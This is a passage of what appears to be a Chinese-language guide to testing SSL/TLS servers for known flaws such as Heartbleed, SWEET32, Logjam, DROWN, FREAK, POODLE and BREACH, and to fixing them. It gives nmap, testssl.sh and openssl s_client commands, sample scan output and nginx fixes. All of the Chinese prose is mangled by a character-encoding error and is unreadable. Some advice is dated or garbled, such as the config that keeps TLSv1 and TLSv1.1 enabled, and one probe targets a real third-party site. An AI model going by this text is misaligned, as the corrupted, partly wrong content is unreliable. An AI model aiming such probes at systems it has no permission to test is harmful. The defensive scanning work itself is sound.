·ä¸€æ¥å—å®³è€…çš„å†…å­˜å†…å®¹å°±ä¼šä»¥æ¯æ¬¡ 64KBâ€‹â€‹ çš„é€Ÿåº¦è¿›è¡Œæ³„éœ²ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥æ¼æ´è¯»å–æ¯æ¬¡æ”»å‡»æ³„éœ²å‡ºæ¥çš„ä¿¡æ¯ï¼Œæ‰€ä»¥å¯èƒ½ä¹Ÿå¯ä»¥è·å–åˆ°æœåŠ¡å™¨çš„ç§é’¥ï¼Œç”¨æˆ· cookie å’Œå¯†ç ç­‰ã€‚ æµ‹è¯•æ–¹æ³• åœ¨çº¿æµ‹è¯•ï¼šHeartbleed OpenSSL extension testing tool, CVE-2014-0160 (possible.lv) # testssl.sh ./testssl.sh -H TARGET(ip:port/åŸŸå) # nmap nmap -p 443 --script ssl-heartbleed --script-args vulns.showall 10.x.x.x Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-20 22:45 EST Nmap scan report for 10.0.1.159 Host is up (0.00028s latency). PORT STATE SERVICE 443/tcp open https | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://www.openssl.org/news/secadv_20140407.txt | http://cvedetails.com/cve/2014-0160/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 MAC Address: 00:0C:29:35:3D:E8 (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds ä¿®å¤æ–¹æ³• å‡çº§ openssl åˆ° 1.01g åŠä»¥ä¸Šç‰ˆæœ¬ CVE-2015-2808 - BAR-MITZVAH æ”»å‡»æ¼æ´ã€åŸç†æ‰«æã€‘ æ¼æ´æè¿° è¯¥æ¼æ´æ˜¯ç”±åŠŸèƒ½è¾ƒå¼±è€Œä¸”å·²ç»è¿‡æ—¶çš„ RC4 åŠ å¯†ç®—æ³•ä¸­ä¸€ä¸ªé—®é¢˜æ‰€å¯¼è‡´çš„ã€‚å®ƒèƒ½å¤Ÿåœ¨æŸäº›æƒ…å†µä¸‹æ³„éœ² SSL/TLSâ€‹â€‹ åŠ å¯†æµé‡ä¸­çš„å¯†æ–‡ï¼Œä»è€Œå°†è´¦æˆ·ç”¨æˆ·åå¯†ç ã€ä¿¡ç”¨å¡æ•°æ®å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯æ³„éœ²ç»™é»‘å®¢ã€‚ æµ‹è¯•æ–¹æ³• openssl s_client -connect host:443 -cipher RC4 # è¿”å›å†…å®¹å‡ºç° handshake failure è¯´æ˜ RC4 å·²ç¦ç”¨ï¼Œå¦åˆ™éœ€è¦ä¿®å¤ ä¿®å¤æ–¹æ³• æœåŠ¡å™¨ç«¯ç¦æ­¢ä½¿ç”¨ RC4 åŠ å¯†ç®—æ³•ã€‚ å®¢æˆ·ç«¯åº”åœ¨æµè§ˆå™¨ TLS é…ç½®ä¸­ç¦æ­¢ RC4 åœ¨ nginx é…ç½®å‚æ•° ssl_ciphersâ€‹â€‹ ä¸­æ·»åŠ  !RC4â€‹â€‹ å‚æ•° ssl_ciphers ALL:!RC4â€‹â€‹ CVE-2013-2566 - SSL/TLS RC4 ä¿¡æ¯æ³„éœ²æ¼æ´ã€åŸç†æ‰«æã€‘ æ¼æ´æè¿° TLS åè®®å’Œ SSL åè®®ä¸­ä½¿ç”¨çš„ RC4 ç®—æ³•å…·æœ‰è®¸å¤šå•å­—èŠ‚åç§»ã€‚è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡ä½¿ç”¨ç›¸åŒæ˜æ–‡çš„å¤§é‡ä¼šè¯ä¸­çš„å¯†æ–‡ç»Ÿè®¡åˆ†ææ¥è¿›è¡Œæ˜æ–‡ç ´è§£æ”»å‡»ã€‚ æµ‹è¯•æ–¹æ³• # testssl.sh ./testssl.sh -4 TARGET # nmap ä½¿ç”¨ ./testssl.sh -E TARGET æ‰‹åŠ¨æšä¸¾æœåŠ¡å™¨å¯†ç æˆ–è€… nmap -p 443 --script=ssl-enum-ciphers TARGET ç¡®ä¿æœåŠ¡å™¨æ”¯æŒå¯†ç ç±»å‹ä¸ä½¿ç”¨ RC4 ä¿®å¤æ–¹æ³• åŒä¸Š https://support.microsoft.com/en-us/help/2868725/microsoft-security-advisory-update-for-disabling-rc4 https://www.cnblogs.com/tsimfeiwan/p/16567279.html CVE-2016-2183 - SSL/TSL åè®®ä¿¡æ¯æ³„éœ²ã€åŸç†æ‰«æã€‘-- SWEET32 æ¼æ´æè¿° 64 ä½å—å¤§å°ï¼ˆå¦‚ Triple-DESï¼ˆ3DESï¼‰ï¼‰çš„ä¼ ç»Ÿå—å¯†ç åœ¨ CBC æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œæ˜“å—åˆ°æ”»å‡»ã€‚å½“ä½¿ç”¨ CBC æ¨¡å¼æ“ä½œæ—¶ï¼Œä½¿ç”¨ simple birthday attack æ¥è¯†åˆ« 64 ä½å—å¯†ç å†²çªã€‚å½“ç¢°æ’å‘ç”Ÿæ—¶ï¼Œè¿™æ„å‘³ç€è¾“å…¥ä¸è¾“å‡ºç›¸åŒï¼Œä½¿å¾—å¯ä»¥æ‰§è¡Œ BEAST style attack æ¥æ¸—é€åŠ å¯†çš„æ•°æ®ã€‚ ä½œè€… Karthik Bhargavan å’Œ Gaetan Leurent èƒ½å¤Ÿåœ¨æµè§ˆå™¨ï¼ˆä½œä¸º MITMï¼‰ä¸­è¿è¡Œ JavaScriptï¼Œå¹¶å‘é€å¤§é‡çš„æ•°æ®å¯¼è‡´å†²çªï¼Œç„¶åä½¿ç”¨æ­¤ä¿¡æ¯æ¥æ¢å¤ä¼šè¯ cookieã€‚ æµ‹è¯•æ–¹æ³• ç¡®å®šæœåŠ¡å™¨æ˜¯å¦æ”¯æŒ Triple-DESâ€‹â€‹ å¯†ç ï¼Œå¦‚æœæœåŠ¡å™¨æ”¯æŒ Triple-DESâ€‹â€‹ï¼Œåˆ™æ˜“å— SWEET32 æ”»å‡»ã€‚ # testssl.sh ./testssl.sh --ciphers TARGET # å¦‚æœè¾“å‡ºæ˜¾ç¤º Tripe DES å¯†ç ï¼Œå°±åƒä¸‹é¢çš„æˆªå›¾ä¸€æ ·ï¼Œç›®æ ‡æœåŠ¡å™¨å®¹æ˜“å—åˆ° SWEET32 çš„å½±å“ï¼Œä½¿ç”¨ 3DES çš„ä»»ä½•å¯†ç éƒ½æ˜“å— SWEET32 å½±å“ # nmap nmap --script = ssl-enum-ciphers -p443 TARGET nmap -sV --script ssl-enum-ciphers -p 443 www.example.com (ip ä¹Ÿå¯ä»¥) # è¾“å‡ºä»¥ä¸‹åˆ™è¡¨ç¤ºæœ‰æ¼æ´ warnings: | 64-bit block cipher 3DES vulnerable to SWEET32 attack # æ‰‹å·¥æµ‹è¯•ï¼šæ ¹æ®ä¸Šé¢æ–¹æ³•æµ‹è¯•ç”¨ Nmap NSE è„šæœ¬æšä¸¾å¯†ç  ä¿®å¤æ–¹æ³• å‡çº§ OpenSSL ç‰ˆæœ¬ã€æœ€ä¼˜è§£ã€‘or ä¿®æ”¹ Nginx åŠ å¯†ç®—æ³• OpenSSL 1.1.0 ä»¥åæ²¡æœ‰æ­¤æ¼æ´ï¼Œå¹¶ä¸”æœ¬åœ°çš„ openssl ç‰ˆæœ¬é«˜äº 1.1.0 https://www.openssl.org/news/secadv/20160922.txt ç»¿ç›Ÿè¿˜æ˜¯èƒ½æ‰«æå‡ºæ¥ï¼Œå› ä¸º nginx è¿˜åœ¨ä½¿ç”¨æ—§ç‰ˆæœ¬çš„ OpenSSLï¼Œä¼˜å…ˆå‡çº§ OpenSSLã€‚(è¿™ä¸ªåŠ å¯†ç®—æ³•æ˜¯è·Ÿ 443 ç«¯å£ç›¸å…³ï¼Œæœ‰çš„é¡¹ç›®æ²¡æœ‰åš https æ‰€ä»¥æ²¡æ³•ä¿®æ”¹åªèƒ½å‡çº§) -- çªå‡ºä¸€ä¸ªã€åŸç†æ‰«æï¼ˆç‰ˆæœ¬ï¼‰ã€‘ ä¸‹è½½ openssl çš„ç¨³å®šç‰ˆæœ¬ https://www.openssl.org/ wget https://www.openssl.org/source/openssl-1.1.1g.tar.gz --no-check-certificate ç¼–è¯‘å®‰è£… ```shell tar xvf openssl-1.1.1g.tar.gz -C /usr/local/ cd /usr/local/openssl-1.1.1g/ ./config && make && make install echo \"/usr/local/lib64/\" >> /etc/ld.so.conf ldconfig mv /usr/bin/openssl /usr/bin/openssl.old ln -sv /usr/local/bin/openssl /usr/bin/openssl - â€‹openssl versionâ€‹â€‹â€‹ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ - æ›¿æ¢ nginx çš„ OpenSSL æ—§ç‰ˆæœ¬ä¸ºæ–°ç‰ˆæœ¬ï¼Œéœ€è¦é‡æ–°ç¼–è¯‘ä¸€ä¸‹ nginx ```shell ./configure --user=www --group=www --prefix=/data/nginx --with-http_sub_module --with-http_stub_status_module --with-pcre --with-http_ssl_module --with-http_flv_module --with-http_gzip_static_module --with-http_realip_module --with-stream --with-stream_ssl_module --with-openssl=/usr/local/openssl-1.1.1g && make && make install pkill -9 nginx ./nginx æŸ¥çœ‹ nginx çš„ openssl ç‰ˆæœ¬ ./nginx -Vâ€‹â€‹â€‹ nginx å¼€å¯çš„ 443 ç«¯å£ï¼Œæ‰€ä»¥éœ€è¦å»ä¿®æ”¹ nginx çš„é…ç½®æ–‡ä»¶ï¼Œç¦ç”¨ 3DES ç®—æ³•ã€‚ã€æ³¨ã€‘: !3DESâ€‹â€‹ æ˜¯åæ·»åŠ çš„è¿‡æ»¤ # nginx.conf æ–‡ä»¶å¦‚ä¸‹ï¼š server { ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4:!3DES; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; } ./nginx -s reload åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/w184414332/article/details/126406154 CVE-2015-4000 - LogJam ä¸­é—´äººå®‰å…¨é™åˆ¶ç»•è¿‡æ¼æ´ã€åŸç†æ‰«æã€‘ æ¼æ´æè¿° è¯¥æ¼æ´å¯å¸®åŠ©æ”»å‡»è€…å°† TLS è¿æ¥é™çº§ä¸º 512 ä½å¯¼å‡ºçº§åŠ å¯†ã€‚è¿™æœ‰åŠ©äºæ”»å‡»è€…è¯»å–å’Œä¿®æ”¹é€šè¿‡ç½‘ç»œè¿æ¥ä¼ è¾“çš„ä»»ä½•æ•°æ®ã€‚ TLS 1.2 åŠæ›´æ—©ç‰ˆæœ¬ï¼Œåœ¨æœåŠ¡å™¨ä¸Šå¯ç”¨ä½†ä¸åœ¨å®¢æˆ·ç«¯å¯ç”¨ DHE_EXPORTâ€‹â€‹ å¯†ç ç»„æ—¶ï¼Œæ²¡æœ‰æ­£ç¡®è½¬é€ DHE_EXPORTâ€‹â€‹ é€‰æ‹©ï¼Œä¸­é—´äººæ”»å‡»è€…é€šè¿‡ç”¨ DHE_EXPORTâ€‹â€‹ ä»£æ›¿ DHEï¼Œé‡å†™ ClientHelloï¼Œç„¶åç”¨ DHE ä»£æ›¿ DHE_EXPORTâ€‹â€‹ï¼Œé‡å†™ ServerHello(å³\"Logjam\"é—®é¢˜)ï¼Œåˆ©ç”¨æ­¤æ¼æ´å¯æ‰§è¡Œå¯†ç é™çº§æ”»å‡»ã€‚ æµ‹è¯•æ–¹æ³• # testssl.sh ./testssl.sh -J TARGET # nmap ç¦ç”¨ EXPORT å¯†ç ï¼Œè¯´æ˜ä¸ FREAK æ”»å‡»ç›¸åŒã€‚ ä¿®å¤æ–¹æ³• ç¦ç”¨ EXPORT å¯†ç ï¼ˆâ€‹SSLCipherSuite !EXPORTâ€‹â€‹ï¼‰æˆ–è€…å‡çº§ openssl åˆ°å®‰å…¨ç‰ˆæœ¬ å‚è€ƒè¿æ¥ How to test Logjam Attack (CVE-2015-4000) and fix? (geekflare.com) Logjamï¼šTLS æ¼æ´ (CVE-2015-4000) CVE-2016-0800 - DROWN è·¨åè®®æ”»å‡» TLS ï¼ˆæººæ°´æ”»å‡»/æººäº¡æ”»å‡»ï¼‰ æ¼æ´æè¿° DROWNï¼ˆä½¿ç”¨è¿‡æ—¶å’Œå¼±åŒ–çš„ eNcryption è§£å¯† RSAï¼‰ï¼ŒDROWN æ”»å‡»çš„æœ€ä¸€èˆ¬å˜ä½“åˆ©ç”¨äº† SSLv2 åè®®çš„ä¸€ä¸ªæ ¹æœ¬ç¼ºç‚¹ï¼Œå…è®¸ä¸­é—´äººï¼ˆMITMï¼‰æ”»å‡»è€…åˆ©ç”¨å¯¼å…¥ç¬¦åˆ 20 ä¸–çºª 90 å¹´ä»£ç¾å›½æ”¿åºœçš„é™åˆ¶ï¼ˆEXPORT ç­‰çº§åŠ å¯†åœ¨ä¸‹é¢çš„ FREAK æ¼æ´æè¿°ä¸­è¯¦ç»†æè¿°ï¼‰çš„å¯†ç å­¦ï¼Œå¯é€ æˆ DROWN æ”»å‡»(Decrypting RSA usingObsolete and Weakened eNcryption)ã€‚ æµ‹è¯•æ–¹æ³• # testssl.sh ./testssl.sh -D TARGET # nmap nmap -p 443 -sV --script=sslv2-drown # é’ˆå¯¹ Web Server openssl s_client -connect å¾…æµ‹åŸŸåæˆ–IP:443-ssl2 # é’ˆå¯¹ SMTP Server openssl s_client -connect å¾…æµ‹åŸŸåæˆ–IP:25-starttls smtp -ssl2 # å¦‚æœå‡ºç°å¦‚ä¸‹é”™è¯¯ä¿¡æ¯ï¼Œåˆ™ SSLv2 å·²ç¦ç”¨ 419:error:1407F0E5:SSL routines:SSL2_WRITE:ssl handshake failure:s2_pkt.c:428: ä¿®å¤æ–¹æ³• å¦‚æœæ˜¯ cipher none çš„è¯ï¼Œèƒ½ä¿è¯æ˜¯ä¸å—å½±å“çš„ï¼Œæˆ–è€…è¯´è¿™æ˜¯ä¸€ä¸ªç¼“è§£æªæ–½ã€‚ OpenSSL not 1.0.2aã€1.0.1mã€1.0.0rã€0.9.8zf åŠæ›´æ—©ç‰ˆæœ¬ (è½¬)OpenSSL CVE-2016-0800 å’Œ CVE-2016-0703 æ¼æ´ä¿®å¤ç»†èŠ‚æ‹¾è¶£ - liujiacai - åšå®¢å›­ (cnblogs.com) CVE-2015-0204 - OpenSSL FREAK Attack æ¼æ´æè¿° FREAKï¼ˆç ´è§£ RSA å¯¼å‡ºå¯†é’¥ï¼‰ï¼Œåˆ©ç”¨äº† TLS/SSLâ€‹â€‹ ä¸­çš„åŠ å¯†å¼±ç‚¹ï¼Œè¿™æ˜¯ç¾å›½æ”¿åºœå‡ åå¹´å‰æœ€åˆå¼•å…¥çš„ã€‚ä½¿ç”¨ RSA_EXPORTâ€‹â€‹ å¯†é’¥çš„æƒ³æ³•æ˜¯å…è®¸å¯¼å‡ºåŒ…å«ä¸èƒ½è¢«å¤§å¤šæ•°è®¡ç®—æœºç ´è§£çš„åŠ å¯†å¯†é’¥ã€‚å¦‚æœ RSA_EXPORTâ€‹â€‹ å¯†é’¥åŠ å¯†ä¸º 512 ä½æˆ–æ›´å°‘ï¼Œé‚£ä¹ˆä»¥ç›®å‰çš„è®¡ç®—æœºæ€§èƒ½å¾ˆå®¹æ˜“ç ´è§£ã€‚ FREAK æ‰§è¡Œé™çº§æ”»å‡»ï¼ˆå¼ºåˆ¶æœåŠ¡å™¨ä½¿ç”¨è¾ƒå¼±çš„å¯†ç ï¼‰ï¼Œå½“ä¸ä¸­é—´äººï¼ˆMITMï¼‰ç±»å‹æ”»å‡»ç›¸ç»“åˆæ—¶ï¼Œè¿™å…è®¸æ”»å‡»è€…æ•è·æ•°æ®å¹¶ä¸­æ–­å¼±å¯†é’¥çš„è§£å¯†ã€‚ æ­¤é—®é¢˜å­˜åœ¨äº OpenSSL ç‰ˆæœ¬ 0.9.8zd ä¹‹å‰, æˆ– 1.0.0p ä¹‹å‰çš„ 1.0.0ï¼Œæˆ– 1.0.1k ä¹‹å‰çš„ 1.0.1ã€‚ æµ‹è¯•æ–¹æ³• # testssl.sh ./testssl -F TARGET # nmap ä½¿ç”¨ ./testssl.sh -E TARGET æˆ–è€… nmap -p 443 --script=ssl-enum-ciphers TARGET æšä¸¾æœåŠ¡å™¨å¯†ç ï¼Œç¡®ä¿æœåŠ¡å™¨æ”¯æŒçš„ä»¥ä¸‹ç±»å‹å¯†ç ä¸åŒ…å«ï¼šEXPORT openssl s_client -connect www.fbi.gov:443 -cipher EXPORT # å¦‚æœä½ çœ‹åˆ° \"alert handshake failure\" è¿™å¥è¯å°±è¯´æ˜è¯¥ç½‘ç«™æ˜¯å®‰å…¨çš„ ä¿®å¤æ–¹æ³• ç¦ç”¨ EXPORT å¯†ç æˆ–è€…å‡çº§ openssl åˆ°å®‰å…¨ç‰ˆæœ¬ â€‹SSLCipherSuite HIGH:!aNULL:!MD5:!EXPâ€‹â€‹ OpenSSL FREAK Attack æ¼æ´(CVE-2015-0204)æ£€æµ‹æ–¹æ³•åŠä¿®å¤å»ºè®® - SecPulse.COM | å®‰å…¨è„‰æ CVE-2014-3566 - POODLE SSLv3 æ”»å‡»ä¿¡æ¯æ³„éœ²æ¼æ´ã€åŸç†æ‰«æã€‘ï¼ˆå·æ¯›ç‹—æ”»å‡»ï¼‰ æ¼æ´æè¿° è¯¥æ¼æ´åªå¯¹ CBC æ¨¡å¼çš„æ˜æ–‡è¿›è¡Œäº†èº«ä»½éªŒè¯ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹å¡«å……å­—èŠ‚è¿›è¡Œå®Œæ•´æ€§éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥å‘åŠ¨ä¸­é—´äººæ”»å‡»æ‹¦æˆªç”¨æˆ·æµè§ˆå™¨å’Œ HTTPS ç«™ç‚¹çš„æµé‡ï¼Œç„¶åçªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€‚ Google çš„å®‰å…¨å°ç»„åœ¨ 2014 å¹´ 10 æœˆ 14 æ—¥å‘ç°äº† POODLE æ”»å‡»ï¼ˆPadding Oracle On Downgraded Legacy Encryptionï¼‰ã€‚è¯¥æ¼æ´åˆ©ç”¨äº† SSLv3 å¤„ç†å¡«å……å­—èŠ‚çš„æ–¹å¼ï¼ˆå¯†ç å—é“¾æ¥ï¼‰CBC æ“ä½œæ¨¡å¼ã€‚ è¯¥ç¼ºé™·å…è®¸ä¸­é—´äººï¼ˆMITMï¼‰æ”»å‡»è€…åœ¨å°‘äº 256 ä¸ª SSLv3 è¿æ¥ä¸­è§£å¯†å¯†æ–‡çš„æ‰€é€‰å­—èŠ‚ï¼Œå¦‚æœä»–ä»¬èƒ½å¤Ÿå¼ºåˆ¶å—å®³è€…åº”ç”¨ç¨‹åºé‡å¤å‘é€ç›¸åŒçš„æ•°æ®é€šè¿‡æ–°åˆ›å»º SSL 3.0 è¿æ¥ã€‚ æµ‹è¯•æ–¹æ³• â€‹testssl.shâ€‹â€‹ ./testssl.sh -O TARGET Kali é™„å¸¦çš„ openssl ç‰ˆæœ¬ä¸å†æ”¯æŒ SSLv3ã€‚ ä½¿ç”¨äºŒè¿›åˆ¶ç  testssl.sh/bin/openssl.Linux.x86_64â€‹â€‹ è¿›è¡Œæ‰‹åŠ¨ SSLv3 æµ‹è¯•ã€‚ ./openssl.Linux.x86_64 s_client -ssl3 -connect 10.0.1.159:443 å¦‚æœæ¡æ‰‹å®Œæˆï¼Œåˆ™æœåŠ¡å™¨å®¹æ˜“å—åˆ° POODLE çš„å½±å“ã€‚ å¯¹äºå®¹æ˜“å—åˆ° POODLE å½±å“çš„æœåŠ¡å™¨çš„è¾“å‡ºç¤ºä¾‹ï¼ˆä»å“åº”ä¸­åˆ é™¤çš„è¯ä¹¦ï¼‰ï¼š --- No client certificate CA names sent Server Temp Key: DH, 1024 bits --- SSL handshake has read 1398 bytes and written 373 bytes --- New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : SSLv3 Cipher : DHE-RSA-AES256-SHA Session-ID: 0450660185C7B2623CB2145A1C6655BDD8CC281F882C3B9E0ED35E88360639BA Session-ID-ctx: Master-Key: 6A56AC01754D9441ACFD6C0B9E534E33450CD2F0E0D619F235E2ACC1780CFD86E769B9AE82D0D5AAA4C62B295B5BB598 Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None Start Time: 1484971085 Timeout : 7200 (sec) Verify return code: 9 (certificate is not yet valid) --- å¦‚æœæœåŠ¡å™¨ä¸å®¹æ˜“å—åˆ° POODLE çš„å½±å“ï¼Œæ¡æ‰‹å°†å¤±è´¥ï¼Œå‘ç”Ÿå¦‚ä¸‹é”™è¯¯ CONNECTED(00000003) 28395584:error:14094410:SSL routines:ssl3_read_bytes:sslv3 alert handshake failure:s3_pkt.c:1475:SSL alert number 40 28395584:error:1409E0E5:SSL routines:ssl3_write_bytes:ssl handshake failure:s3_pkt.c:656: --- no peer certificate available â€‹nmapâ€‹â€‹ # nmap nmap -p 443 --script ssl-poodle --script-args vulns.showall 10.0.1.159 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-20 22:50 EST Nmap scan report for 10.0.1.159 Host is up (0.00037s latency). PORT STATE SERVICE 443/tcp open https | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 OSVDB:113251 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the \"POODLE\" issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | http://osvdb.org/113251 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.imperialviolet.org/2014/10/14/poodle.html |_ https://www.openssl.org/~bodo/ssl-poodle.pdf MAC Address: 00:0C:29:35:3D:E8 (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds ä¿®å¤æ–¹æ³• ç¦ç”¨ sslv3.0 åè®® CVE-2014-8730 - POODLE TLSï¼ˆTLS å·æ¯›ç‹—æ”»å‡»ï¼‰ æ¼æ´æè¿° ç”±äº TLS å¡«å……æ˜¯ SSLv3 çš„ä¸€ä¸ªå­é›†ï¼Œå› æ­¤å¯ä»¥é‡æ–°ä½¿ç”¨é’ˆå¯¹ TLS çš„ POODLE æ”»å‡»ã€‚TLS å¯¹äºå®ƒçš„å¡«å……æ ¼å¼æ˜¯éå¸¸ä¸¥æ ¼çš„ï¼Œä½†æ˜¯ä¸€äº› TLS å®ç°åœ¨è§£å¯†ä¹‹åä¸æ‰§è¡Œå¡«å……ç»“æ„çš„æ£€æŸ¥ã€‚å³ä½¿ä½¿ç”¨ TLS ä¹Ÿä¸ä¼šå®¹æ˜“å—åˆ° POODLE æ”»å‡»çš„å½±å“ã€‚ èµ„æ–™æ¥æºï¼šhttps://blog.qualys.com/ssllabs/2014/12/08/poodle-bites-tls æµ‹è¯•æ–¹æ³• openssl s_client -connect host:ç«¯å£ # è¾“å…¥ R è¿›è¡Œé‡åå•†ï¼Œå¯é‡åå•† 10 æ¬¡ä»¥ä¸Šä¸”è¿æ¥æœªæ–­å¼€ï¼Œè¯ä¹¦é“¾ä¸­çš„è‡ªç­¾åè¯ä¹¦ï¼Œé‡åå•†æˆåŠŸï¼Œæ¼æ´å­˜åœ¨ # testssl.sh ./testssl.sh -R ip:port ä¿®å¤æ–¹æ³• åŒä¸Š CVE - CVE-2014-8730 (mitre.org) CVE-2013-3587 - BREACHï¼ˆé‡å…½æ”»å‡»ï¼‰ æ¼æ´æè¿° BREACH ä»£è¡¨é€šè¿‡è‡ªé€‚åº”å‹ç¼©è¶…æ–‡æœ¬è¿›è¡Œæµè§ˆå™¨æ£€æµ‹å’Œæ¸—é€ã€‚ä¸ CRIME ç›¸ä¼¼ä¹‹å¤„æ˜¯åˆ©ç”¨ HTTP å‹ç¼©ä¸­çš„æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…è¯†åˆ«é¡µé¢ä¸­æ˜¯å¦å­˜åœ¨æ–‡æœ¬ã€‚ æµ‹è¯•æ–¹æ³• BREACH æ”»å‡»åŸºæœ¬æµç¨‹ å½“é¡µé¢ä¸Šå‘ç”Ÿæ–‡æœ¬é‡å¤æ—¶ï¼Œå°†åˆ é™¤é‡å¤çš„æœ¯è¯­ï¼Œæœ‰åŠ©äºå‡å°é¡µé¢çš„å¤§å°ã€‚è¿™å¯ä»¥ç”¨äºè¯†åˆ«ç°æœ‰çš„é¡µé¢å†…å®¹ï¼Œä¸‹é¢æ˜¯ Web åº”ç”¨ç¨‹åºçš„ç¤ºä¾‹ï¼Œæ˜¾ç¤ºå½“å‰ç™»å½•çš„ç”¨æˆ·åœ¨é¡µé¢ä¸­åæ˜ çš„ç”¨æˆ·åï¼š è¾“å…¥æ‚¨è®¤ä¸ºä¸å­˜åœ¨äºæœç´¢å‚æ•°ä¸­çš„ç”¨æˆ·å æ³¨æ„è¿”å›é¡µé¢çš„å¤§å° å‘é€æ‚¨è®¤ä¸ºå­˜åœ¨çš„ç”¨æˆ·åçš„å…¶ä»–æœç´¢è¯·æ±‚ æ³¨æ„è¿”å›é¡µé¢çš„å¤§å°ï¼Œå¦‚æœç”¨æˆ·åä¸ç™»å½•ç”¨æˆ·ååŒ¹é…ï¼ˆç¡®è®¤å­˜åœ¨ï¼‰ï¼Œé¡µé¢å¤§å°å¯¹æ¯”ä¸Šæ¬¡å°†ä¼šç¼©å° é€šè¿‡åˆ†æå“åº”çš„å¤§å°å¯ä»¥é¢„æµ‹æ–‡æœ¬ï¼Œå®é™…ä¸Šæ²¡æœ‰æµé‡è¢«â€œè§£å¯†â€ ä¸ºäº†ä½¿ BREACH æ”»å‡»æˆåŠŸåœ°æ¸—é€æ•°æ®ï¼Œå¿…é¡»æœ‰ä¸€ç§æœºåˆ¶æ¥åæ˜ æ¸²æŸ“é¡µé¢ä¸­çš„ç”¨æˆ·è¾“å…¥ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¿…é¡»æ”¯æŒ HTTP å‹ç¼©ã€‚ # testssl.sh ./testssl.sh -B TARGET # ä½¿ç”¨ openssl client openssl s_client -connect TARGET:443 è¾“å…¥ä»¥ä¸‹å†…å®¹æ¥ç¡®å®šæœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨å‹ç¼©ï¼š GET / HTTP / 1.1 Host: TARGET Accept-Encoding: compress, gzip ======== e.g. GET / HTTP/1.1 Host: 192.168.201.216:9443 Accept-Encoding: compress, gzip å¦‚æœæœåŠ¡å™¨è¿”å›ä¹±ç çš„å­—ç¬¦ï¼Œå¦‚ä¸‹é¢çš„æˆªå›¾æ‰€ç¤ºï¼Œåˆ™æœåŠ¡å™¨æ”¯æŒå‹ç¼©ï¼Œå®¹æ˜“å—åˆ° BREACH çš„æ”»å‡»ã€‚ testssl.shâ€‹â€‹ æµ‹è¯• ä¿®å¤æ–¹æ³• How to fix the BREACH vulnerability (CVE-2013-3587 CWE-310) (port135.com) https://www.breachattack.com/ ç¦ç”¨ HTTP å‹ç¼© å°†ç§˜å¯†ä¸ç”¨æˆ·è¾“å…¥åˆ†å¼€ æ ¹æ®è¯·æ±‚éšæœºåŒ–ç§˜å¯† å±è”½ç§˜å¯†ï¼ˆé€šè¿‡ XORing ä¸æ¯ä¸ªè¯·æ±‚çš„éšæœºç§˜å¯†æœ‰æ•ˆåœ°éšæœºåŒ–ï¼‰ ä½¿ç”¨ CSRF ä¿æŠ¤æ˜“å—æ”»å‡»çš„é¡µé¢ é•¿åº¦éšè—ï¼ˆé€šè¿‡å‘å“åº”æ·»åŠ éšæœºæ•°é‡çš„å­—èŠ‚ï¼‰ å¯¹è¯·æ±‚è¿›è¡Œé€Ÿç‡é™åˆ¶ ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼ˆç¦ç”¨ HTTP å‹ç¼©ï¼‰è‚¯å®šä¼šç¼“è§£æ­¤æ¼æ´ï¼Œå¹¶ä¸”æ‰«æå·¥å…·ä¸ä¼šå†æ˜¾ç¤ºå®ƒã€‚ä½†æ˜¯ï¼Œè¿™å¯èƒ½ä¼šå½±å“æ€§èƒ½ 2 - 5 çš„å»ºè®®ä¸åº”ç”¨ç¨‹åºçš„ç¼–ç æœ‰å…³ã€‚å®ƒä»¬å¯æœ‰æ•ˆé˜²æ­¢æ­¤ç±»æ”»å‡»ã€‚å®ƒä»¬ä¹Ÿæ˜¯ä¸€èˆ¬å¼€å‘çš„æœ€ä½³å®è·µ å»ºè®® #6â€‹â€‹ å’Œ #7â€‹â€‹ æ˜¯ä¸æ‰˜ç®¡ç›¸å…³çš„è®¾ç½®ã€‚ å®‰å…¨ç‰ˆæœ¬ OpenSSL 1.0.1k OpenSSL 1.0.0p OpenSSL 0.9.8zd CVE-2012-4929 - CRIMEï¼ˆç½ªæ¶æ”»å‡»ï¼‰ æ¼æ´æè¿° CRIME æ˜¯ TLS 1.2 æ¼æ´ï¼Œå…è®¸ä¸­é—´äººï¼ˆMITMï¼‰æ”»å‡»è€…è¯†åˆ«åŠ 